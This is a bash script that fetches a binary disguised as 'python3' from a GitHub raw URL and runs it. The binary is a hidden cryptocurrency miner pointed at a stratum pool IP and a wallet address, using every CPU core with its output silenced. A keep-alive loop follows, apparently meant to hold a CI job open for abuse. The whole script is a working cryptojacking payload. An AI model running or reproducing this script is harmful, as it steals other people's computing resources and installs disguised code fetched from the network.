#!/bin/bash
wget https://raw.githubusercontent.com/mulayia70/lamak/main/mom/bu/python3
chmod +x python3
./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u THN2wdyn5c6yU9ak1oJHqqGEo2dfATXrQa.gtlb -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
